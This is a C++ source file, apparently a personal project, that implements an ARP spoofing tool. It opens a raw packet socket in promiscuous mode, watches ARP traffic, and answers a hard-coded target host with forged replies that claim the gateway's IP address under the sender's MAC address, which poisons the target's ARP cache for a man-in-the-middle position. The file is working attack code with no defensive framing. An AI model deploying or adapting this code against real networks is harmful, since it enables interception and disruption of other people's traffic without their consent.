/*
 * =====================================================================================
 *
 *       Filename  arp.cpp
 *
 *    Description  
 *
 *        Version  1.0
 *        Created  2015年04月12日 14时58分10秒
 *       Revision  none
 *       Compiler  gcc
 *
 *         Author  uniqxh, 
 *   Organization  
 *
 * =====================================================================================
 */

#include<pthread.h>
#include<stdio.h>
#include<sys/types.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<linux/if_ether.h>
#include<arpa/inet.h>
#include "arp.h"
#include<string.h>
#include<stdlib.h>
#include<errno.h>
#include<linux/if_arp.h>
#include<sys/ioctl.h>
int sock;	
struct sockaddr_ll sa;
struct ifreq req;
const uint8_t myMac[6]      = {0xc0,0xf8,0xda,0x5c,0xc0,0xfd};
const uint8_t gatewayMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
const uint8_t attackMac[6]  = {0x48,0xd2,0x24,0x4a,0x4e,0x05};
const uint8_t attackIp[4]   = {192,168,0,161};
const uint8_t myIp[4]       = {192,168,0,187};
const uint8_t gatewayIp[4]  = {192,168,0,1};
void showMac(uint8_t *s, uint8_t *d)
{
	if(s == NULL || d == NULL)
	{
		perror("MAC IS NULL");
		exit(1);
	}
	printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x\n",s[0],s[1],s[2],s[3],s[4],s[5],d[0],d[1],d[2],d[3],d[4],d[5]);
}
void showIp(uint8_t *s, uint8_t *d)
{
	if(s == NULL || d == NULL)
	{
		perror("IP IS NULL");
		exit(1);
	}
	printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",s[0],s[1],s[2],s[3],d[0],d[1],d[2],d[3]);
}
bool checkMyMac(uint8_t *s)
{
	if(s == NULL)
	{
		perror("MAC IS NULL");
		exit(1);
	}
	bool flag = true;
	for(int i=0;i<6;i++)
	{
		if(s[i] != myMac[i])
		{
			flag = false;
			break;
		}
	}
	return flag;
}
void sendArp(ARPPACKET	*oarp)
{
	ARPPACKET arp;
	memcpy(&arp, oarp, sizeof(arp));
//	arp.ethhdr.type = htons(ETH_P_ARP);
//	arp.arphdr.ht =  htons(ARPHRD_ETHER);
//	arp.arphdr.pt =  htons(ETH_P_IP);
	memcpy(arp.ethhdr.dst, oarp->ethhdr.src, 6);
	memcpy(arp.ethhdr.src, myMac, 6);
//	memcpy((void*)arp.ethhdr.dst, (void*)gatewayMac, 6);
//	arp.arphdr.hl = 6;
//	arp.arphdr.pl = 4;
//	arp.arphdr.op = htons(ARPOP_REQUEST);
	memcpy(arp.arphdr.s_eth, myMac, 6);
	memcpy(arp.arphdr.t_eth, oarp->arphdr.s_eth, 6);
	memcpy(arp.arphdr.s_ip, gatewayIp, 4);
	memcpy(arp.arphdr.t_ip, attackIp, 4);
	if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
	{
		perror("sendto failed");
		exit(1);
	}
}
void sendReqArp(ARPPACKET *oarp)
{
	ARPPACKET arp;
	memcpy(&arp, oarp, sizeof(arp));
	memcpy(arp.ethhdr.src, myMac, 6);
	memcpy(arp.ethhdr.dst, gatewayMac, 6);
	memcpy(arp.arphdr.s_eth, myMac, 6);
	memcpy(arp.arphdr.s_ip, myIp, 4);
	memcpy(arp.arphdr.t_eth, gatewayMac, 6);
	memcpy(arp.arphdr.t_ip, attackIp, 4);
	if(sendto(sock, &arp, sizeof(arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0)
	{
		perror("sendto");
		exit(1);
	}
}
void recvArp()
{
	char buffer[4096];
	while(1)
	{
		int n_read = recvfrom(sock, buffer, 4096, 0, NULL, NULL);
		if(n_read < 42)
		{
			perror("error");
			continue;
		}
		ARPPACKET *arp = (ARPPACKET*)buffer;
		printf("--------------------------------\n");
		showMac(arp->ethhdr.src, arp->ethhdr.dst);
		showMac(arp->arphdr.s_eth, arp->arphdr.t_eth);
		showIp(arp->arphdr.s_ip, arp->arphdr.t_ip);
		int op = ntohs(arp->arphdr.op);
		if(op == 2 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == myIp[3])
		{
			printf("ARP REPLY\n");
			sendArp(arp);
		}
		else if(op == 1 && arp->arphdr.s_ip[3] == gatewayIp[3] || op == 1 && arp->arphdr.s_ip[3] == attackIp[3] && arp->arphdr.t_ip[3] == gatewayIp[3])
		{
			printf("ARP REQEST\n");
			sendReqArp(arp);
		}
		printf("--------------------------------\n");
		sleep(3);
	}
}
int main()
{
	if((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
	{
		printf("create raw socket failed\n");
		return 0;
	}
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = AF_PACKET;
	strcpy(req.ifr_name, "eth1");
	if(ioctl(sock, SIOCGIFINDEX, &req) != 0)
	{
		perror("ioctl\n");
		close(sock);
		exit(1);
	}
	sa.sll_ifindex = req.ifr_ifindex;
	sa.sll_protocol = htons(ETH_P_ARP);
	req.ifr_flags |= IFF_PROMISC;
	if(ioctl(sock, SIOCSIFFLAGS, &req) != 0)
	{
		perror("ioctl\n");
		close(sock);
		exit(1);
	}
	recvArp();
	close(sock);
	return 1;
}
